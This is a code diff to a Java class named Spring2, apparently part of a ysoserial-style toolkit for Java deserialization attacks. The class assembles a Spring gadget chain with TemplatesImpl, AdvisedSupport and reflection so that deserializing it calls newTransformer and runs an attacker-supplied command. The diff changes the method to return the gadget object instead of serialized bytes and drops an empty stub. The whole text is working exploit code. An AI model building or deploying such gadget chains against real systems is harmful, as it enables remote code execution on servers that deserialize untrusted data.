@@ -30,7 +30,7 @@ import static java.lang.Class.forName;
  */
 public class Spring2 implements ObjectPayload<Object>{
     @Override
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(type,param);
 
         AdvisedSupport as = new AdvisedSupport();
@@ -49,17 +49,7 @@ public class Spring2 implements ObjectPayload<Object>{
         Reflections.setFieldValue(mitp, "provider", typeProviderProxy);
         Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(mitp);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
+        return mitp;
     }
 
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
-    }
 }
